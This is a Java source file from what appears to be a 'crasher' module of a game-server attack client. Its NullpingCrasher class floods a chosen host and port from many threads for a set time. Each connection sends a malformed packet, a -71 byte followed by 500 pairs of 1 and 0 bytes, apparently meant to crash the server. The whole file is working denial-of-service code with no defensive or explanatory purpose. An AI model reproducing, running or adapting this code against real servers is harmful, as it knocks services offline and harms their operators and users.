package com.teamti.timc.modules.crasher;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class NullpingCrasher {
    public static int threads = 0;

    public static void pingThreadCrasher(String host, int port, int maxThreads, long time) {

        time = TimeUnit.SECONDS.toMillis(time);
        long time1 = System.currentTimeMillis();

        do {
            if (threads < maxThreads) {
            	
            	
                new Thread(){

                    @Override
                    public void run() {
                        ++threads;
                        try {
                            ping(host, port);
                        } catch (Exception exception) {
                        }
                        --threads;
                    }
                }.start();
            }
            try {
                Thread.sleep(1L);
            }
            catch (InterruptedException interruptedException) {
            }
        } while ((System.currentTimeMillis() - time1) < time);
    }

    public static void ping(String host, int port) throws IOException {

        Socket socket = new Socket(host, port);
        DataOutputStream out = new DataOutputStream(socket.getOutputStream());

        out.write(-71);
        for (int i = 0; i < 500; ++i) {
            out.write(1);
            out.write(0);
        }
    }
}